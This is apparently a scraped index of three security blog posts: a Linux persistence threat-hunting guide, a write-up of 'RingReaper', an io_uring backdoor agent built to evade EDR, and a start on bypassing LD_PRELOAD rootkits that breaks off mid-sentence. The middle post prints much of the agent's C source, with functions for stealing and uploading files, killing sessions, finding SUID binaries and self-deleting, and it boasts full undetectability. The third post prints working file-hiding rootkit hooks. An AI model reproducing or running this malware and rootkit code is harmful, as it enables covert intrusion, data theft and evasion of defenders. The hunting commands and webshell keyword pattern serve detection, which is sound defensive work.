maintain persistence as well.\nIn a scenario where an attacker has compromised one of your Linux machines and knows that at any time he may lose access to the machine or a specific directory/file, he can abuse the ACL (access control list) by using the setfacl command to change Control access to a file or directory for any user you want, with whatever permissions you want.\nNow the user kali can access /root even without being root, because we changed the ACL of the /root directory for the user kali be able to have read, write and execute permissions.\nTo be able to do a hunt, it\u0026rsquo;s very simple, just use the command getfacl which basically displays the access control lists (ACLs) associated with files and directories and then use setfacl -b DIR/FILE for remove ACL.\nWe can also create a simple bash script to run and whatever it finds in ACL it will print on the screen.\n#!/bin/bash users=$(awk -F\u0026#39;:\u0026#39; \u0026#39;$1!=\u0026#34;root\u0026#34; {print $1}\u0026#39; /etc/passwd) check_acl_for_user() { local user=\u0026#34;$1\u0026#34; echo \u0026#34;Checking ACLs for user: $user\u0026#34; acl_output=$(getfacl -R /* | grep \u0026#34;^# file: \\|user:$user$\u0026#34;) if [[ -n \u0026#34;$acl_output\u0026#34; ]]; then echo \u0026#34;$acl_output\u0026#34; fi } for user in $users; do check_acl_for_user \u0026#34;$user\u0026#34; done Hunting init.d persistence init.d are the scripts that are executed at machine startup, that is, as soon as the machine is turned on, the scripts that are on it are executed, and this is like gold for an attacker, as he can simply add a reverse shell payload, or execute any script he wants, as soon as the machine starts/restarts.\nNow after reboot:\nTo remove it is quite simple.\nFor hunting just check these two directories:\nls -la /etc/init.d/* ls -la /etc/rc*.d/ Hunting MOTD Persistence MOTD (Message of the Day) is a message displayed to users when they log into a system, usually through SSH or the console. It is a way of providing important information, such as maintenance notices, usage policies, system news or any other relevant information to users.\nThis persistence technique basically consists of creating a malicious MOTD that when someone join into the machine using ssh for example, our Malicious MOTD will be executed, below is an example of how it works.\nBasically what we did was go to /etc/update-motd.d and create a new MOTD containing the path of a reverse shell script, so that as soon as someone sshs in, the reverse shell will be executed and Regardless of which user you enter, the shell will always be root, as ssh runs as root.\nTo be able to hunt you can check these directories looking for an Abnormal MOTD.\nls -la /etc/update-motd.d/* /usr/lib/update-notifier/update-motd-updates-available cat /etc/motd find / -name \u0026#34;*motd*\u0026#34; 2\u0026gt;/dev/null Hunting for hidden process mounted This technique of using mount to mount a process in another directory is quite old, but it\u0026rsquo;s worth knowing how it works and knowing how to undo it.\nTo be able to hunt, it\u0026rsquo;s very simple, just use the mount command to see what is mounted.\nmount mount|grep proc umount /proc/PID umount -l /proc/PID Hunting for webshells Of course, using webshells for persistence is an old technique. When an attacker gains access to a machine, even without elevated privileges, they can deploy a webshell. A webshell allows the attacker to access the machine, even without direct access to the server via browser/web and from there, the attacker can execute commands and even execute a reverse shell to gain access to the server without depending on the webshell.\nHere we have an example of a simple webshell in PHP.\nWe can detect it using this oneline and with tools too.\ngrep -rlE \u0026#39;fsockopen|pfsockopen|exec|shell|system|eval|rot13|base64|base32|passthru|\\$_GET|\\$_POST\\$_REQUEST|cmd|socket\u0026#39; /var/www/html/*.php | xargs -I {} echo \u0026#34;Suspicious file: {}\u0026#34; We can also look at the apache logs, it also shows what the file was.\nWe can also use tools like BackDoorMan, NeoPI, Shell-Detector and WebShell-AIHunter that help in detecting malicious webshells.\nHunting rc.local persistence rc.local is a startup script in Linux used to execute custom commands or scripts during the system boot process, however it has been replaced by more modern methods such as systemd service units.\nAn attacker could add a reverse shell to /etc/rc.local and every time your machine is started, the content on it will be executed with root privileges, thus providing very good and effective persistence.\nAfter the reboot, the content inside rc.local which was the reverse shell was executed successfully and we can see its process.\nWe can also see when it was run using systemctl status rc-local.\nTo be able to hunt, just check these files and directories:\n/etc/rc.local /lib/systemd/system/rc-local.service.d cat /run/systemd/generator/multi-user.target.wants/rc-local.service systemctl status rc-local So this was the post, I hope you liked it, if you have any questions or if you didn\u0026rsquo;t understand any part, DM me on Twitter: @MatheuzSecurity\nSo that\u0026rsquo;s it, until next time!\n","permalink":"http://localhost:1313/hacking/linux-threat-hunting-persistence/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/lM0kWBM.jpeg\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eHello everyone, welcome to this post, where I will cover the topic “Linux Threat Hunting Persistence”.\u003c/p\u003e\n\u003cp\u003eThe objective of this post is to learn how to hunt for persistence on Linux machines, without using paid tools/framework, just using the tools that are already available (open source) for anyone to download and use and also using Linux\u0026rsquo;s own resources to be able to do hunt for persistence.\u003c/p\u003e\n\u003cp\u003eBelow is what we will cover in this post.\u003c/p\u003e","title":"Linux Threat Hunting Persistence"},{"content":"Full source: https://github.com/MatheuZSecurity/RingReaper\nTable of Contents Introduction What is io_uring? The Agent Code Analysis How Does the EDR Typically Fail Here? Practical EDR Bypass Python C2 Server Flow Defensive Reflections Conclusion Introduction Each year, new security solutions emerge to protect Linux systems against increasingly sophisticated threats. Technologies such as EDR (Endpoint Detection and Response) evolve rapidly, making the work of an attacker more challenging.\nWe, as red teamers, we need to stay one step ahead, seeking to understand not only the defenses, but also how to creatively circumvent them.\nIn this article, I will explore the use of io_uring, a legitimate Linux kernel feature designed for high-performance asynchronous I/O, but which can be adapted to evade traditional syscall-based detection mechanisms. We will see how modern techniques can enable stealthy and silent operations, bypassing EDR and other monitoring mechanisms, and what this means for both attackers and defenders.\nWhat is io_uring? io_uring was introduced in Linux starting from kernel 5.1. It provides a highly performant model for asynchronous I/O operations, using submission and completion rings. In other words:\nThe process places I/O requests into a queue shared with the kernel The kernel executes them when it can, without blocking the user thread The result comes back through another completion ring The critical point is that this model allows for multiple operations (opening a file, sending data, reading from a socket, etc.) without the typical sequence of blocking syscalls that most EDRs monitor. Instead of repeatedly calling read, write, send, connect, everything happens through io_uring_submit() and mapped buffers.\nThe Agent This agent essentially acts as a \u0026ldquo;backdoor\u0026rdquo;, though it\u0026rsquo;s not persistent yet, at the time of writing, persistence modules haven\u0026rsquo;t been implemented. However, they will be added in the future. The agent connects to a server (C2) controlled by the attacker and accepts commands. It was designed with:\nNetwork communication using io_uring_prep_send and io_uring_prep_recv File reading via io_uring_prep_openat and io_uring_prep_read File upload without explicit write or read syscalls Post-exploitation command execution (listing users, processes, connections, etc.) Self-deletion (self-destruct) that removes its own binary using io_uring_prep_unlinkat On the Python-based C2 server, an operator sends interactive commands, and the agent responds discreetly.\nCode analysis of the agent send_all\nint send_all(struct io_uring *ring, int sockfd, const char *buf, size_t len) { size_t sent = 0; while (sent \u0026lt; len) { struct io_uring_sqe *sqe = io_uring_get_sqe(ring); io_uring_prep_send(sqe, sockfd, buf + sent, len - sent, 0); io_uring_submit(ring); struct io_uring_cqe *cqe; io_uring_wait_cqe(ring, \u0026amp;cqe); int ret = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (ret \u0026lt;= 0) return ret; sent += ret; } return sent; } This function ensures that a complete buffer is sent by a socket using asynchronous io_uring calls, in a way that is robust against partial sends. It works in a loop that continues until all requested bytes have been sent. For each iteration, it obtains an SQE (Submission Queue Entry) from io_uring, prepares a send (io_uring_prep_send) from the point not yet transmitted in the buffer, submits the operation, and waits for the result in the Completion Queue.\nUpon receiving confirmation from the kernel, it checks whether there was an error or whether the socket was closed (return zero or negative). If there was no error, it adds the sent bytes to the total and repeats until finished.\nThe goal is to abstract the normal limitations of the traditional send (which can send only part of the data) and perform the complete send with the minimum of blocking calls, taking advantage of the asynchronous and efficient io_uring model.\nrecv_all:\nssize_t recv_all(struct io_uring *ring, int sockfd, char *buf, size_t len) { struct io_uring_sqe *sqe = io_uring_get_sqe(ring); struct io_uring_cqe *cqe; io_uring_prep_recv(sqe, sockfd, buf, len, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); ssize_t ret = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); return ret; } This function reads data from a socket, also using io_uring asynchronously. Unlike send_all, it only reads once per call, since a recv is usually enough to receive the entire expected packet, without worrying about ensuring that the entire buffer has been filled.\nIt obtains the SQE, configures the receive operation (io_uring_prep_recv) with the buffer size, submits it to the kernel, and waits for the result via Completion Queue.\nIt then marks the CQE as processed and returns the number of bytes received to the caller. Thus, the function integrates data reception into the same asynchronous queue, maintaining high performance without blocking the thread.\nread_file_uring:\nThis function encapsulates the reading of an entire file using asynchronous io_uring operations, without relying on traditional blocking calls. It first opens the file with io_uring_prep_openat, waits for the result, and if successful, enters a loop to read chunks of the file in successive blocks, using io_uring_prep_read.\nEach block read is accumulated in a buffer, and the offset advances as it progresses. Reading continues until the buffer is full or until it reaches the end of the file (returning zero or negative on read). Finally, it closes the file and returns the total bytes loaded. It is a useful function to bring entire files into memory in a non-blocking way, always taking advantage of io_uring.\ncmd_users:\nvoid cmd_users(struct io_uring *ring, int sockfd) { char buf[8192]; int ret = read_file_uring(ring, \u0026#34;/var/run/utmp\u0026#34;, buf, sizeof(buf)); if (ret \u0026lt;= 0) { const char *err = \u0026#34;Error reading /var/run/utmp\\n\u0026#34;; send_all(ring, sockfd, err, strlen(err)); return; } int count = ret / sizeof(struct utmp); struct utmp *entries = (struct utmp*)buf; char out[8192]; size_t out_pos = 0; out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;Logged users:\\n\u0026#34;); for (int i = 0; i \u0026lt; count; i++) { if (entries[i].ut_type == USER_PROCESS) { out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;%-8s %-8s\\n\u0026#34;, entries[i].ut_user, entries[i].ut_line); if (out_pos \u0026gt; sizeof(out) - 100) break; } } send_all(ring, sockfd, out, out_pos); } This function implements the users command, listing the users logged into the system. It reads the /var/run/utmp file (where Linux stores login sessions) via read_file_uring, parses the USER_PROCESS records, extracts usernames and their TTYs (terminals), formats a list and sends it back to the client via send_all. It is a way to show who is logged in, remotely and asynchronously.\ncmd_ss:\nvoid cmd_ss(struct io_uring *ring, int sockfd) { char buf[8192]; int ret = read_file_uring(ring, \u0026#34;/proc/net/tcp\u0026#34;, buf, sizeof(buf)); if (ret \u0026lt;= 0) { const char *err = \u0026#34;Error reading /proc/net/tcp\\n\u0026#34;; send_all(ring, sockfd, err, strlen(err)); return; } char out[16384]; size_t out_pos = 0; out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;Local Address Remote Address State UID\\n\u0026#34;); char *line = strtok(buf, \u0026#34;\\n\u0026#34;); line = strtok(NULL, \u0026#34;\\n\u0026#34;); while (line) { unsigned int sl, local_ip, local_port, rem_ip, rem_port, st, uid; sscanf(line, \u0026#34;%u: %8X:%X %8X:%X %X %*s %*s %*s %u\u0026#34;, \u0026amp;sl, \u0026amp;local_ip, \u0026amp;local_port, \u0026amp;rem_ip, \u0026amp;rem_port, \u0026amp;st, \u0026amp;uid); char local_str[32], rem_str[32]; snprintf(local_str, sizeof(local_str), \u0026#34;%d.%d.%d.%d:%d\u0026#34;, (local_ip \u0026amp; 0xFF), (local_ip \u0026gt;\u0026gt; 8) \u0026amp; 0xFF, (local_ip \u0026gt;\u0026gt; 16) \u0026amp; 0xFF, (local_ip \u0026gt;\u0026gt; 24) \u0026amp; 0xFF, local_port); snprintf(rem_str, sizeof(rem_str), \u0026#34;%d.%d.%d.%d:%d\u0026#34;, (rem_ip \u0026amp; 0xFF), (rem_ip \u0026gt;\u0026gt; 8) \u0026amp; 0xFF, (rem_ip \u0026gt;\u0026gt; 16) \u0026amp; 0xFF, (rem_ip \u0026gt;\u0026gt; 24) \u0026amp; 0xFF, rem_port); out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;%-22s %-22s %-5X %u\\n\u0026#34;, local_str, rem_str, st, uid); if (out_pos \u0026gt; sizeof(out) - 100) break; line = strtok(NULL, \u0026#34;\\n\u0026#34;); } send_all(ring, sockfd, out, out_pos); } The cmd_ss function provides a sort of mini-netstat, reading /proc/net/tcp to collect active TCP connections. It skips the first line header and processes the rest via sscanf, converting hexadecimal addresses to decimal notation, displaying the IP, port, connection state, and UID of the socket owner. The final output is formatted as text and sent to the client with send_all, all in a way that looks like the real Linux ss command, but using asynchronous kernel file reading.\ncmd_get;\nvoid cmd_get(struct io_uring *ring, int sockfd, const char *path) { struct io_uring_sqe *sqe; struct io_uring_cqe *cqe; int fd; sqe = io_uring_get_sqe(ring); io_uring_prep_openat(sqe, AT_FDCWD, path, O_RDONLY, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); fd = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (fd \u0026lt; 0) { char err[256]; snprintf(err, sizeof(err), \u0026#34;Failed to open %s: %s\\n\u0026#34;, path, strerror(-fd)); send_all(ring, sockfd, err, strlen(err)); return; } char buf[BUF_SIZE]; ssize_t ret; off_t offset = 0; while (1) { sqe = io_uring_get_sqe(ring); io_uring_prep_read(sqe, fd, buf, sizeof(buf), offset); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); ret = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (ret \u0026lt;= 0) break; offset += ret; if (send_all(ring, sockfd, buf, ret) \u0026lt;= 0) { break; } } close(fd); } cmd_get is used to transfer files from the server to the client. It tries to open the specified path, and if successful, it reads blocks from the file with io_uring_prep_read and sends these blocks sequentially to the client with send_all. If it fails to open, it sends the client an error message. It is a way to download files from the server remotely.\ncmd_recv:\nvoid cmd_recv(struct io_uring *ring, int sockfd, const char *args) { char remote_path[256]; long expected_size = 0; char buf[BUF_SIZE]; if (sscanf(args, \u0026#34;%255s %ld\u0026#34;, remote_path, \u0026amp;expected_size) != 2 || expected_size \u0026lt;= 0) { const char *msg = \u0026#34;Usage: recv \u0026lt;remote_path\u0026gt; \u0026lt;size\u0026gt;\\n\u0026#34;; send_all(ring, sockfd, msg, strlen(msg)); return; } struct io_uring_sqe *sqe; struct io_uring_cqe *cqe; sqe = io_uring_get_sqe(ring); io_uring_prep_openat(sqe, AT_FDCWD, remote_path, O_WRONLY | O_CREAT | O_TRUNC, 0644); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); int fd = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (fd \u0026lt; 0) { char err[128]; snprintf(err, sizeof(err), \u0026#34;Failed to open %s: %s\\n\u0026#34;, remote_path, strerror(-fd)); send_all(ring, sockfd, err, strlen(err)); return; } off_t offset = 0; while (offset \u0026lt; expected_size) { size_t to_read = (expected_size - offset \u0026gt; BUF_SIZE) ? BUF_SIZE : (expected_size - offset); sqe = io_uring_get_sqe(ring); io_uring_prep_recv(sqe, sockfd, buf, to_read, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); ssize_t received = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (received \u0026lt;= 0) { break; } sqe = io_uring_get_sqe(ring); io_uring_prep_write(sqe, fd, buf, received, offset); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); io_uring_cqe_seen(ring, cqe); offset += received; } close(fd); } cmd_me:\nvoid cmd_me(struct io_uring *ring, int sockfd) { char buf[128]; pid_t pid = getpid(); char *tty = ttyname(STDIN_FILENO); if (!tty) tty = \u0026#34;(none)\u0026#34;; snprintf(buf, sizeof(buf), \u0026#34;PID: %d\\nTTY: %s\\n\u0026#34;, pid, tty); send_all(ring, sockfd, buf, strlen(buf)); } This command collects information about the running process, such as the PID and associated TTY, using traditional POSIX calls (getpid and ttyname), since io_uring does not support this. It then sends this data to the client using send_all. This is a way of “identifying” the remote agent.\ncmd_ps:\nvoid cmd_ps(struct io_uring *ring, int sockfd) { DIR *dir = opendir(\u0026#34;/proc\u0026#34;); if (!dir) { send_all(ring, sockfd, \u0026#34;Failed to open /proc\\n\u0026#34;, 21); return; } struct dirent *entry; char out[16384]; size_t pos = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;PID CMD\\n\u0026#34;); while ((entry = readdir(dir)) != NULL) { if (entry-\u0026gt;d_type != DT_DIR) continue; char *endptr; long pid = strtol(entry-\u0026gt;d_name, \u0026amp;endptr, 10); if (*endptr != \u0026#39;\\0\u0026#39;) continue; char comm_path[64]; snprintf(comm_path, sizeof(comm_path), \u0026#34;/proc/%ld/comm\u0026#34;, pid); char name[256]; int ret = read_file_uring(ring, comm_path, name, sizeof(name)); if (ret \u0026gt; 0) { name[strcspn(name, \u0026#34;\\n\u0026#34;)] = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;%-7ld %s\\n\u0026#34;, pid, name); if (pos \u0026gt; sizeof(out) - 100) break; } } closedir(dir); send_all(ring, sockfd, out, pos); } The cmd_ps function walks /proc to list active processes, identifying numerical directories (PIDs), and reading the command name of each process from /proc/[pid]/comm. Reading the process name is done using read_file_uring, but directory scanning does not use io_uring because it is not supported. The output is formatted into a PID + command listing, sent via send_all. It works like a remote “ps”.\ncmd_kick:\nvoid cmd_kick(struct io_uring *ring, int sockfd, const char *arg_raw) { char out[4096]; if (!arg_raw) arg_raw = \u0026#34;\u0026#34;; char *arg = (char *)arg_raw; trim_leading(\u0026amp;arg); if (strlen(arg) == 0) { DIR *d = opendir(\u0026#34;/dev/pts\u0026#34;); if (!d) { snprintf(out, sizeof(out), \u0026#34;Failed to open /dev/pts: %s\\n\u0026#34;, strerror(errno)); send_all(ring, sockfd, out, strlen(out)); return; } struct dirent *entry; size_t pos = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;Active pts sessions:\\n\u0026#34;); while ((entry = readdir(d)) != NULL) { if (entry-\u0026gt;d_name[0] \u0026gt;= \u0026#39;0\u0026#39; \u0026amp;\u0026amp; entry-\u0026gt;d_name[0] \u0026lt;= \u0026#39;9\u0026#39;) { pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;pts/%s\\n\u0026#34;, entry-\u0026gt;d_name); if (pos \u0026gt; sizeof(out) - 100) break; } } closedir(d); send_all(ring, sockfd, out, pos); return; } char target_tty[64]; snprintf(target_tty, sizeof(target_tty), \u0026#34;/dev/pts/%s\u0026#34;, arg); DIR *proc = opendir(\u0026#34;/proc\u0026#34;); if (!proc) { snprintf(out, sizeof(out), \u0026#34;Failed to open /proc: %s\\n\u0026#34;, strerror(errno)); send_all(ring, sockfd, out, strlen(out)); return; } int found_pid = 0; struct dirent *dent; while ((dent = readdir(proc)) != NULL) { char *endptr; long pid = strtol(dent-\u0026gt;d_name, \u0026amp;endptr, 10); if (*endptr != \u0026#39;\\0\u0026#39;) continue; char fd_path[256]; snprintf(fd_path, sizeof(fd_path), \u0026#34;/proc/%ld/fd\u0026#34;, pid); DIR *fd_dir = opendir(fd_path); if (!fd_dir) continue; struct dirent *fd_ent; while ((fd_ent = readdir(fd_dir)) != NULL) { if (fd_ent-\u0026gt;d_name[0] == \u0026#39;.\u0026#39;) continue; char link_path[512]; char link_target[512]; ssize_t link_len; snprintf(link_path, sizeof(link_path), \u0026#34;%s/%s\u0026#34;, fd_path, fd_ent-\u0026gt;d_name); link_len = readlink(link_path, link_target, sizeof(link_target) -1); if (link_len \u0026lt; 0) continue; link_target[link_len] = 0; if (strcmp(link_target, target_tty) == 0) { found_pid = (int)pid; break; } } closedir(fd_dir); if (found_pid) break; } closedir(proc); if (!found_pid) { snprintf(out, sizeof(out), \u0026#34;No process found using %s\\n\u0026#34;, target_tty); send_all(ring, sockfd, out, strlen(out)); return; } if (kill(found_pid, SIGKILL) == 0) { snprintf(out, sizeof(out), \u0026#34;Killed process %d using %s\\n\u0026#34;, found_pid, target_tty); } else { snprintf(out, sizeof(out), \u0026#34;Failed to kill process %d: %s\\n\u0026#34;, found_pid, strerror(errno)); } send_all(ring, sockfd, out, strlen(out)); } This command searches for open sessions in /dev/pts (virtual terminals) and, if the user wishes, forcibly kills a process that is using one of these terminals. It first lists the active terminals, then searches /proc for file descriptors that point to the target terminal, and sends a SIGKILL to the process that is using it. All this by combining POSIX calls (like readlink) and asynchronous sending with send_all.\ncmd_privesc:\nvoid cmd_privesc(struct io_uring *ring, int sockfd) { DIR *dir = opendir(\u0026#34;/usr/bin\u0026#34;); if (!dir) { send_all(ring, sockfd, \u0026#34;Failed to open /usr/bin\\n\u0026#34;, 23); return; } struct dirent *entry; char out[16384]; size_t pos = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;Potential SUID binaries:\\n\u0026#34;); while ((entry = readdir(dir)) != NULL) { char path[512]; snprintf(path, sizeof(path), \u0026#34;/usr/bin/%s\u0026#34;, entry-\u0026gt;d_name); struct io_uring_sqe *sqe = io_uring_get_sqe(ring); struct io_uring_cqe *cqe; struct statx stx; io_uring_prep_statx(sqe, AT_FDCWD, path, 0, STATX_ALL, \u0026amp;stx); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); if (cqe-\u0026gt;res == 0 \u0026amp;\u0026amp; (stx.stx_mode \u0026amp; S_ISUID)) { pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;%s\\n\u0026#34;, path); if (pos \u0026gt; sizeof(out) - 100) break; } io_uring_cqe_seen(ring, cqe); } closedir(dir); send_all(ring, sockfd, out, pos); } This function scans the /usr/bin directory looking for binaries that have the SUID bit enabled, which could be privilege escalation vectors (privesc). For each binary, it does a statx via io_uring and checks the SUID flag. The result is formatted and sent to the client, listing possible privilege exploit candidates.\ncmd_selfdestruct:\nvoid cmd_selfdestruct(struct io_uring *ring, int sockfd) { const char *msg = \u0026#34;Agent will self-destruct\\n\u0026#34;; send_all(ring, sockfd, msg, strlen(msg)); char exe_path[512]; ssize_t len = readlink(\u0026#34;/proc/self/exe\u0026#34;, exe_path, sizeof(exe_path)-1); if (len \u0026gt; 0) { exe_path[len] = \u0026#39;\\0\u0026#39;; struct io_uring_sqe *sqe = io_uring_get_sqe(ring); struct io_uring_cqe *cqe; io_uring_prep_unlinkat(sqe, AT_FDCWD, exe_path, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); if (cqe-\u0026gt;res \u0026lt; 0) { char err[128]; snprintf(err, sizeof(err), \u0026#34;Unlink failed: %s\\n\u0026#34;, strerror(-cqe-\u0026gt;res)); send_all(ring, sockfd, err, strlen(err)); } io_uring_cqe_seen(ring, cqe); } exit(0); } How Does the EDR Typically Fail Here? A standard EDR intercepts:\nCalls to open Calls to connect Calls to read and write This monitoring is usually done via hooks or eBPF. What this agent does is \u0026ldquo;bypass\u0026rdquo; these direct calls using io_uring. The kernel handles the I/O without exposing each syscall individually, generating far fewer events to be audited.\nIn essence, the EDR sees fewer \u0026ldquo;door knocks\u0026rdquo; because io_uring sends a batch of operations to the kernel and receives the responses in bulk. This strategy generates much less noise and makes it easier to go unnoticed.\nPractical EDR Bypass With this agent, virtually all network and file operations are handled through io_uring.\nSo an EDR would need to monitor io_uring_enter and understand the full submission/completion flow of events to identify behavior — which is still uncommon in most commercial solutions.\nAdditionally, the traffic goes through a standard HTTPS port (443), making it harder to separate legitimate from malicious traffic.\nBelow is a screenshot from an environment running EDR:\nRingReaper is currently completely FUD (Fully Undetectable) to some EDRs at the time of writing this article. You can do anything, exfiltrate data, read /etc/shadow, access sensitive files, upload content, all RingReaper features remain fully undetected by some EDRs, with evasion working flawlessly.\nPython C2 Server Flow The server.py is quite straightforward:\nWaits for a connection Receives commands from a terminal Sends them to the agent Displays the response It also supports file uploads (put), basically by informing the file size and sending the content sequentially, so the backdoor can reconstruct the file on the target.\nDefensive Reflections As much as using io_uring to bypass defenses is a clever idea;\nThere’s no magic:\nThe kernel still has to execute the io_uring operations. In theory, a well-designed EDR could hook io_uring_enter or instrument internal calls like __io_uring_submit.\neBPF (Berkeley Packet Filter) could be used to trace these operations, but the reality is that few products today deeply monitor io_uring-related syscalls.\nIt’s essential that defenders become familiar with this kind of technique, as it’s likely to become increasingly popular in advanced Linux malware.\nConclusion This agent demonstrates that io_uring, a legitimate Linux feature, can be repurposed to evade syscall-based security solutions.\nIts asynchronous control level enables the construction of discreet, fast, and much harder-to-detect backdoors.\nFor red teamers, t shows the power of modern evasion techniques.\nFor defenders, the takeaway is clear: start studying hooks for io_uring, because it’s only a matter of time before this becomes mainstream in the Linux malware landscape.\nJoin in rootkit researchers\nhttps://discord.gg/66N5ZQppU7 ","permalink":"http://localhost:1313/hacking/evading-linux-edrs-with-io-uring/","summary":"\u003cp\u003eFull source: \u003ca href=\"https://github.com/MatheuZSecurity/RingReaper\"\u003ehttps://github.com/MatheuZSecurity/RingReaper\u003c/a\u003e\u003c/p\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#what-is-io_uring\"\u003eWhat is io_uring?\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#the-agent\"\u003eThe Agent\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#code-analysis\"\u003eCode Analysis\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#how-does-the-edr-typically-fail-here\"\u003eHow Does the EDR Typically Fail Here?\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#practical-edr-bypass\"\u003ePractical EDR Bypass\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#python-c2-server-flow\"\u003ePython C2 Server Flow\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#defensive-reflections\"\u003eDefensive Reflections\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eEach year, new security solutions emerge to protect Linux systems against increasingly sophisticated threats. Technologies such as \u003ccode\u003eEDR (Endpoint Detection and Response)\u003c/code\u003e evolve rapidly, making the work of an attacker more challenging.\u003c/p\u003e\n\u003cp\u003eWe, as \u003cstrong\u003ered teamers\u003c/strong\u003e, we need to stay one step ahead, seeking to understand not only the defenses, but also how to creatively circumvent them.\u003c/p\u003e","title":"Red Team Tactics: Evading EDR on Linux with io_uring"},{"content":" Introduction In this post, I\u0026rsquo;m going to get into a really cool topic, which is how to bypass the hooks used by LD_PRELOAD rootkits, a technique that is effective against most, if not all, of them.\nLD_PRELOAD LD_PRELOAD is an environment variable used by dynamic linkers on Unix-like systems (such as /lib64/ld-linux-x86-64.so.2 on x86_64 Linux) to force specific shared libraries to be loaded before any others during program execution.\nThis technique allows you to \u0026ldquo;hook\u0026rdquo; functions from standard libraries, such as libc, without modifying the program binary, and is therefore widely used both for debugging and for offensive techniques such as user space rootkits.\nWhen an ELF binary is executed, the dynamic linker resolves external function calls using structures like the Procedure Linkage Table (PLT) and Global Offset Table (GOT). By preloading a custom library via LD_PRELOAD, attackers can override functions like readdir() or fopen().\nExample:\nLD_PRELOAD=./rootkitresearchers.so ls /etc/ld.so.preload\nBesides the environment variable, the /etc/ld.so.preload file can also be used to persistently load a library into all processes on the system (including root). This file is read before any environment variable.\nInstalling and Hiding Directory with Rootkit To demonstrate this, I\u0026rsquo;ll use a simple LD_PRELOAD rootkit that hooks the readdir, readdir64, and fopen functions to change the behavior of file and directory listings. The code is shown below.\nFull source\nstruct dirent *(*orig_readdir)(DIR *dirp); struct dirent *readdir(DIR *dirp) { if (!orig_readdir) orig_readdir = dlsym(RTLD_NEXT, \u0026#34;readdir\u0026#34;); struct dirent *entry; while ((entry = orig_readdir(dirp)) != NULL) { if (strcmp(entry-\u0026gt;d_name, HIDDEN_DIR) != 0 \u0026amp;\u0026amp; strcmp(entry-\u0026gt;d_name, HIDDEN_FILE) != 0) { return entry; } } return NULL; } This snippet above hooks into the readdir function, which is responsible for listing files in a directory. It uses a pointer orig_readdir to store the address of the original function, retrieved with dlsym(RTLD_NEXT, \u0026ldquo;readdir\u0026rdquo;). Then, in a loop, it calls the original function to get each entry in the directory, but filters out (ignores) entries whose name is equal to \u0026ldquo;secret\u0026rdquo; or \u0026ldquo;ld.so.preload\u0026rdquo;. Thus, these entries never appear to the program that called readdir. When there are no more visible entries, it returns NULL.\nstruct dirent64 *(*orig_readdir64)(DIR *dirp); struct dirent64 *readdir64(DIR *dirp) { if (!orig_readdir64) orig_readdir64 = dlsym(RTLD_NEXT, \u0026#34;readdir64\u0026#34;); struct dirent64 *entry; while ((entry = orig_readdir64(dirp)) != NULL) { if (strcmp(entry-\u0026gt;d_name, HIDDEN_DIR) != 0 \u0026amp;\u0026amp; strcmp(entry-\u0026gt;d_name, HIDDEN_FILE) != 0) { return entry; } } return NULL; } This is the same logic but for the 64-bit version readdir64.\nFILE *(*orig_fopen)(const char *pathname, const char *mode); FILE *fopen(const char *pathname, const char *mode) { if (!orig_fopen) orig_fopen = dlsym(RTLD_NEXT, \u0026#34;fopen\u0026#34;); if (strstr(pathname, HIDDEN_FILE) != NULL) { errno = ENOENT; return NULL; } return orig_fopen(pathname, mode); } This fopen hook hides access to specific files by returning a ‘file not found’ error (ENOENT) if the path contains keywords like ‘ld.so.preload’.\nNow let\u0026rsquo;s compile and load it into /etc/ld.so.preload\nOnce loaded, we can test creating a directory named secret, and see if it is hidden from ls.\nAs expected, it was hidden from ls.\n[Theory] Breaking LD_PRELOAD rootkits Here’s something interesting: rootkits that use the LD_PRELOAD technique depend ENTIRELY on the Linux dynamic loader (ld-linux.so) to \u0026ldquo;inject\u0026rdquo; their malicious libraries before the standard system libraries, such as libc. But does this work with all programs?\nThe short and quick answer is: No!\nWhy does LD_PRELOAD work, and why does it sometimes not work?\nLD_PRELOAD, as explained in previous topics, is an environment variable used by ld-linux.so to load extra libraries before others, which allows it to intercept functions from standard libraries (such as libc). In other words, you can replace system functions, such as those that list files or open files, with 